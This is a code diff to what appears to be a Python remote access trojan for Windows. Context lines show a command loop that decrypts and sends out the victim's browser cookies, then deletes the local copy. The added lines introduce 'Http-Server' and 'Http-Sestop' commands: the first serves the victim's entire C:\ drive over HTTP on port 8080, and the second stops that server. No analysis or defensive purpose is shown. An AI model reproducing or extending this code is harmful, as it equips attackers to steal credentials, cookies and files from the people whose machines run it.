@@ -35,6 +35,10 @@ import platform
 import struct
 import windows_tools.antivirus
 from win32crypt import CryptUnprotectData
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+httpd = HTTPServer(('', 8080), SimpleHTTPRequestHandler)
+
 
 
 class chrome(object):
@@ -1141,6 +1145,35 @@ def shell():
                     cookies = open(appd+"\\Cookies.txt",'r').read()
                     reliable_send(cookies)
                     os.remove(appd+"\\Cookies.txt")
+                elif command[:11] == "Http-Server":
+                    try:
+
+
+                        os.chdir("C:\\")
+                        try:
+
+
+                            th = threading.Thread(target=httpd.serve_forever)
+
+                            th.start()
+                        except Exception as e:
+                            reliable_send("[-] Error Starting Server")
+                            # debuging
+                            print(e)
+                        else:
+                            reliable_send("[+] Server Started On Port 8080")
+
+                    except:
+                        continue
+                elif command[:11] == "Http-Sestop":
+                    threading.Thread(target=httpd.shutdown).start()
+                    reliable_send("[+] Http Server Stopped")
+
+
+
+
+
+
 
 
 
